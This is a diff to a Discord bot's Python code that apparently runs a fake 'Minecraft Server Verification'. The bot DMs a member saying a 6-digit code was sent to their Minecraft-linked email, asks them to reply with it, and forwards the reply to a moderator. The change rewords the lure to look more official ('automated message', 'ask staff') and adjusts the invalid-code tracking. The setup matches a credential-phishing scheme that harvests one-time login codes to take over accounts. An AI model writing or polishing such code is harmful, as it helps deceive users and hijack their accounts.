@@ -77,9 +77,12 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
         embed = discord.Embed(
             title="📨 Minecraft Server Verification",
             description=(
-                "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
-                "Reply to this DM with the code to complete verification.\n\n"
-                "🔒 Your info is private. Don't share your code."
+                "We've sent a 6-digit code to your email address linked to your Minecraft account.\n\n"
+                "Please reply to this DM with the code to complete your verification.\n\n"
+                "🔒 Your information will remain private.\n"
+                "If you have any questions, feel free to ask staff!\n"
+                "This is an automated message.\n"
+                "Do not share this code with anyone."
             ),
             color=discord.Color.blue()
         )
@@ -104,6 +107,8 @@ async def on_message(message: discord.Message):
             )
             await mod.send(embed=embed)
             await message.channel.send("✅ Code received. A mod will review it.")
+            if message.author.id in sent_invalid_codes:
+                sent_invalid_codes.remove(message.author.id)
         else:
             if message.author.id not in sent_invalid_codes:
                 embed = discord.Embed(
